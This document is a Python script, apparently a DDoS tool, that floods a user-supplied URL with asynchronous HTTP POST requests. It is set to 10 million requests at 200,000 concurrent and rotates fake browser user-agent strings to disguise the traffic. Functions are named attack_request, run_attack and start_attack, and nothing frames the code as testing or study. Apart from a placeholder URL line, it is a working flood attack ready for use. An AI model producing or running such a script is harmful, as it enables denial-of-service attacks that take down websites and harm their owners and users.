import random
import aiohttp
import asyncio
import time

URL = your url

def random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
    ]
    return random.choice(user_agents)

async def attack_request(session):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Connection": "keep-alive"
    }
    
    try:
        async with session.post(URL, headers=headers, timeout=3, data={"test": "data"}) as response:
            print(f"Request status: {response.status}")
    except asyncio.TimeoutError:
        print("Request timeout")
    except Exception as e:
        print(f"Request error: {e}")

async def run_attack(total_requests, concurrent_requests):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(total_requests):
            tasks.append(attack_request(session))
            if len(tasks) >= concurrent_requests:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)

def start_attack():
    total_requests = 10000000  
    concurrent_requests = 200000  

    start_time = time.time()
    asyncio.run(run_attack(total_requests, concurrent_requests))
    print(f"Attack completed in {time.time() - start_time} seconds.")

if __name__ == "__main__":
    start_attack()
